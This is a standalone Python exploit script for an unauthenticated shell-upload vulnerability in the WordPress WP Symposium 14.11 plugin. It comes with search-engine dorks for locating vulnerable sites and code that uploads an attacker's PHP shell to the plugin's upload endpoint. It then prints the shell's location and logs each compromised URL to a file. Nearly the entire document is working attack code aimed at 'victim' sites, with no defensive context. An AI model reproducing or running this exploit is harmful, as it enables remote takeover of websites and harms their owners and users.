#!/usr/bin/python
#-------------------------------------------------------------------------------
# Exploit Name: Wordpress WP Symposium 14.11 Shell Upload Vulnerability
# DORK:  index of "wp-symposium"
# DORK:  inurl:"plugins/wp-symposium" -site:wordpress.org
import urllib, urllib2, socket
import sys
import string, random
import optparse
import os, os.path, mimetypes
import datetime
import os

def checkurl(url):
    if url[:8] != "https://" and url[:7] != "http://":
        print('[X] You must insert http:// or https:// procotol')
        sys.exit(1)
    else:
        return url
 
def checkfile(file):
    if not os.path.isfile(file) and not os.access(file, os.R_OK):
        print '[X] '+file+' file is missing or not readable'
        sys.exit(1)
    else:
        return file
# Get file's mimetype
def get_content_type(filename):
    return mimetypes.guess_type(filename)[0] or 'application/octet-stream'
 
def id_generator(size=6, chars=string.ascii_uppercase + string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))


# Create multipart header
def create_body_sh3ll_upl04d(payloadname, randDirName, randShellName):
 
   getfields = dict()
   getfields['uploader_uid'] = '1'
   getfields['uploader_dir'] = './'+randDirName
   getfields['uploader_url'] = url_symposium_upload
 
   payloadcontent = open(payloadname).read()
 
   LIMIT = '----------lImIt_of_THE_fIle_eW_$'
   CRLF = '\r\n'
 
   L = []
   for (key, value) in getfields.items():
      L.append('--' + LIMIT)
      L.append('Content-Disposition: form-data; name="%s"' % key)
      L.append('')
      L.append(value)
 
   L.append('--' + LIMIT)
   L.append('Content-Disposition: form-data; name="%s"; filename="%s"' % ('files[]', randShellName+".php"))
   L.append('Content-Type: %s' % get_content_type(payloadname))
   L.append('')
   L.append(payloadcontent)
   L.append('--' + LIMIT + '--')
   L.append('')
   body = CRLF.join(L)
   return body
 
banner = """
"""
 
commandList = optparse.OptionParser('usage: %prog -t URL -f FILENAME.PHP [--timeout sec]')
commandList.add_option('-t', '--target', action="store",
                  help="Insert TARGET URL: http[s]://www.victim.com[:PORT]",
                  )
commandList.add_option('-f', '--file', action="store",
                  help="Insert file name, ex: shell.php",
                  )
commandList.add_option('--timeout', action="store", default=10, type="int",
                  help="[Timeout Value] - Default 10",
                  )
 
options, remainder = commandList.parse_args()
 
# Check args
if not options.target or not options.file:
    print(banner)
    commandList.print_help()
    sys.exit(1)
 
payloadname = checkfile(options.file)
host = checkurl(options.target)
timeout = options.timeout
 
print(banner)
 
socket.setdefaulttimeout(timeout)
 
url_symposium_upload = host+'/wp-content/plugins/wp-symposium/server/php/'
 
content_type = 'multipart/form-data; boundary=----------lImIt_of_THE_fIle_eW_$'
 
randDirName = id_generator()
randShellName = id_generator()
 
bodyupload = create_body_sh3ll_upl04d(payloadname, randDirName, randShellName)
 
headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
           'content-type': content_type,
           'content-length': str(len(bodyupload)) }
 
try:
    req = urllib2.Request(url_symposium_upload+'index.php', bodyupload, headers)
    response = urllib2.urlopen(req)
    read = response.read()

    if "error" in read or read == "0" or read == "":
       now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
       print('0x' + str(now) + '[INFO][NOT VULN]: Upload Failed')
    else:
       now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
       print('0x' + str(now) + '[INFO][VALUE]: Shell Uploaded')
       now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
       print('0x' + str(now) + '[INFO][VALUE]: Location: '+url_symposium_upload+randDirName+randShellName+'.php')
       file_saved = 'poffOUTPUT_Sh311_Upl04d_Vuln3r4b1l1ty.txt'

       msg = '0x[INFO][FILE SAVED]: '+file_saved + "\n"
       url_saved = url_symposium_upload+randDirName+randShellName+".php\n"
    if os.path.exists(file_saved):
       arquivo = open(file_saved, 'a')
       arquivo.write(url_saved)
       arquivo.close()
       print(msg)
    else:
       arquivo = open(file_saved, 'w')
       arquivo.write(url_saved)
       arquivo.close()
       print(msg)
 
except urllib2.HTTPError as e:
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print('0x' + str(now) + '[INFO][ERROR]: '+str(e))
except urllib2.URLError as e:
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print('0x' + str(now) + '[INFO][ERROR]: Connection Error: '+str(e))